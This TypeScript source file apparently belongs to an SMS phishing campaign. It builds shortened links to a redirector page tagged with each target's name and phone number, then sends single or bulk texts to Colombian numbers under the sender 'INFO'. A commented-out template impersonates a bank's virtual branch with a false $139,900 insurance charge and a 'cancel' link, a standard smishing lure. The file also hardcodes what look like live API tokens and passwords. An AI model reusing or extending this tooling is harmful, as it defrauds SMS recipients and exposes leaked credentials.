export const createShortURL = async (name: string | null, phone: string) =>
  await fetch('https://api.t.ly/api/v1/link/shorten', {
    body: JSON.stringify({
      long_url: `https://redirector-mocha-mu.vercel.app/?${
        name ? `name=${name}` : ''
      }&phone=${phone}`,
      domain: 'https://t.ly/',
      expire_at_datetime: '2035-01-17 15:00:00',
      description: 'Social Media Link',
    }),
    headers: {
      accept: 'application/json',
      'accept-language': 'en-US,en;q=0.8',
      authorization:
        'Bearer eBGtvnU1eMCxAgvO9bswAnmfpwL6NaSbPlitqs0WN0ptAV3ODXjDotXZuiu5',
      'content-type': 'application/json',
    },
    method: 'POST',
  }).then((res) => res.json());

const TOKEN_TLY =
  'qwxgQyV18ylRjJEwh0XAYZj6XeIsuNx6W87qMqcdXML1yRYwNh0u6ltg380E';

export const sendSMS = async (
  name: string,
  urlShorter: string,
  num = '3242378501'
) => {
  const baseUrl = 'https://bulksmsplans.com/api/send_sms';
  const params = new URLSearchParams({
    api_id: 'APIVSyFoUzc120965',
    api_password: '573008948802',
    sms_type: 'Transactional',
    sms_encoding: 'text',
    sender: 'INFO',
    number: '57' + num,

    // message: `${name}, Suc. Virtual Personas Te informa que se activo un seguro de celular protegido por $139,900. Si desea cancelar: ${urlShorter} TyC*`,
    message: 'hola',
  });

  const url = `${baseUrl}?${params.toString()}`;

  const response = await fetch(url, {
    method: 'post',
    headers: {
      'Content-Type': 'application/json',
    },
  });
  return response.json(); // Asumiendo que la respuesta es JSON
};
export const customSendSMS = async (message: string, num = '3242378501') => {
  const baseUrl = 'https://bulksmsplans.com/api/send_sms';
  const params = new URLSearchParams({
    api_id: 'APIVSyFoUzc120965',
    api_password: '573008948802',
    sms_type: 'Transactional',
    sms_encoding: 'text',
    sender: 'INFO',
    number: '57' + num,
    message,
  });

  const url = `${baseUrl}?${params.toString()}`;

  const response = await fetch(url, {
    method: 'post',
    headers: {
      'Content-Type': 'application/json',
    },
  });
  return response.json(); // Asumiendo que la respuesta es JSON
};
export const sendMultipleSMS = async (message: string, num: string[]) => {
  const baseUrl = 'https://bulksmsplans.com/api/send_sms_multi';
  const params = new URLSearchParams({
    api_id: 'APIVSyFoUzc120965',
    api_password: '573008948802',
    sms_type: 'Transactional',
    sms_encoding: 'text',
    sender: 'INFO',
    number: num.join(','),
    message,
  });

  const url = `${baseUrl}?${params.toString()}`;

  try {
    const response = await fetch(url, {
      method: 'post',
      headers: {
        'Content-Type': 'application/json',
      },
    });

    if (!response.ok) {
      const errorText = await response.text(); // Obtener el texto de error de la respuesta
      throw new Error(
        `Error en la solicitud: ${response.status} - ${errorText}`
      );
    }

    return response.json(); // Asumiendo que la respuesta es JSON
  } catch (error) {
    console.error('Error al enviar SMS:', error);

    // Retornar un objeto de error para que la función llamante pueda manejarlo
    throw {
      success: false,
      message: 'No se pudo enviar el SMS',
      error: error.message || 'Error desconocido',
    };
  }
};
